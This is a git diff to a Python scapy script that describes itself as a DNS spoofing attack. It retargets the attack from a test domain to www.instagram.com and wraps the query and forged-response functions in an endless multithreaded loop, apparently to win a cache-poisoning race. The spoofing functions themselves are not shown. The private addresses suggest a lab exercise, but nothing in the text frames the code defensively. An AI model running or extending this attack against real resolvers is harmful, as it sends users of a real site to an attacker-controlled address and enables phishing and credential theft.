@@ -20,6 +20,7 @@ Date:
 """
 
 from scapy.all import *
+import threading
 
 
 def query_for_config():
@@ -39,8 +40,8 @@ def manual_config():
     Manually sets the configuration for the DNS spoofing attack.
     """
     
-    server_ip = "10.0.0.1"
-    query_domain = "test123.com"
+    server_ip = "10.0.0.150"
+    query_domain = "www.instagram.com"
     spoofed_ip = "192.168.56.12"
 
     return server_ip, query_domain, spoofed_ip
@@ -91,9 +92,15 @@ def main():
     # server_ip, query_domain, spoofed_ip = query_for_config()
     server_ip, query_domain, spoofed_ip = manual_config()
 
-    send_dns_query(server_ip, query_domain)
-    send_spoofed_response(server_ip, query_domain, spoofed_ip)
+    while True:
+        query_thread = threading.Thread(target=send_dns_query, args=(server_ip, query_domain))
+        spoof_thread = threading.Thread(target=send_spoofed_response, args=(server_ip, query_domain, spoofed_ip))
 
+        query_thread.start()
+        spoof_thread.start()
+        
+        query_thread.join()
+        spoof_thread.join()
 
 if __name__ == "__main__":
     main()
